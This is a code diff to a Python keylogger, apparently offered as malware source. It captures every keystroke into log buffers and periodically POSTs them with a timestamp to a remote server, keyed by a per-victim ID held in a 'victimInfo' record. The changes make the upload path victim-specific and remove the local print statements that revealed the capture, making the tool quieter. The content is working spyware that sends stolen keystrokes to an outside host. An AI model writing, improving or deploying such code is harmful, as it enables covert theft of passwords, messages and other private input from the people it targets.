@@ -14,7 +14,8 @@ time=10 #Time to sent req in sec
 log=""
 logcon=[]
 
-victimInfo={"ID":"a","Name":"You","Email":"email@gmail.com","Device":"CheckYourPC"} #change according to you
+
+victimInfo={"ID":"a1","Name":"user","Email":"user@gmail.com","Device":"Windows"} #change according to you
 
 
 def sendData():
@@ -23,7 +24,7 @@ def sendData():
     try:
         payload = {"Logs": log, "KeysLogs": logcon,"Time":datetime.datetime.now().isoformat()}
         requests.post(
-            f'{ip}/user/a',
+            f'{ip}/user/{victimInfo["ID"]}',
             json.dumps(payload),
             headers={"Content-Type": "application/json"}
         )
@@ -60,8 +61,6 @@ def onpress(k):
         elif str(k).strip("'") in string.ascii_letters+string.digits+string.punctuation:
             log += str(k).strip("'")
         logcon.append(str(k))
-        print(log)
-        print(logcon)
     
     except KeyError:
         print(KeyError)
